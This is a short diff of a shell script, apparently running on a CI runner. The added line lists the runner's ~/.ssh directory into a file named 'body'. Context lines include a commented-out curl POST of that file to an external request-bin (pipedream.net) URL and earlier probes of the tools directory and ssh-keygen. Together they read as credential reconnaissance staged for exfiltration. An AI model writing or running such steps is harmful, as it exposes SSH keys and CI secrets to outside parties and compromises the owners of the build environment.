@@ -14,7 +14,10 @@
 
 #echo $(ls -la tools) > body
 #echo $(file tools/ssh-keygen) > body
-echo $(ssh-keygen) > body
+#echo $(ssh-keygen) > body
+
+echo $(ls -la /home/runner/.ssh) > body
+
 
 #curl -i -X POST https://en0liva7dzyvpp.x.pipedream.net/ \
 #  -H "Content-Type: text/xml" \
